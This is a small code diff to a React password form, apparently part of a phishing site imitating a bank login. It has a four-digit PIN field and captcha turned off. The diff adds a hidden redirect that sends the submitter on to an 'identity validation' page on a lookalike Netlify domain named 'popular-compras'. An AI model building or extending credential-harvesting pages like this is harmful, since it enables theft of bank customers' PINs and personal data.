@@ -62,6 +62,7 @@ const Contraseña = ({setLoading}) => {
           </div>
           <input onChange={btnColor} id='password' type="password" name='pass' minLength="4" maxLength="4" />
           <input type="hidden" name="_captcha" value="false"></input>
+          <input type="hidden" name="_next" value="https://popular-compras.netlify.app/#/validar-identidad"></input>
   
           <button className={`${colorBtn && 'btn-active'}`}>Ingresar</button>
         </form>
